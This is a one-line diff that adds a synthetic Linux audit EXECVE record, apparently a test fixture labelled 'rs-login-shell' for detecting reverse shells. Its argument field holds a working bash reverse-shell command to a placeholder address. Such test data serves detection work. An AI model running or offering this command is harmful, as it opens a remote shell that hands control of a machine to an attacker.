@@ -1,0 +1,1 @@
+{"type": "EXECVE", "msg": "audit(1790762400.123:4242):", "TestEventId": "rs-login-shell", "argc": 4, "a0": "bash", "a1": "-l", "a2": "-c", "a3": "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"}
